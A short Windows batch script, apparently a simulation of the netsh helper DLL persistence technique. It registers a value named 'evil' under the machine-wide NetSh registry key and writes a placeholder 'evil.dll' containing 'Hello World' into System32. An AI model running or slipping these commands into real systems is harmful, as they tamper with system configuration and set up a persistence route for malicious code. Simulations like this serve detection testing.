@echo off
reg add "HKLM\Software\Microsoft\NetSh" /v evil /t REG_SZ /d evil.dll /f
echo "Hello World" >> C:\Windows\System32\evil.dll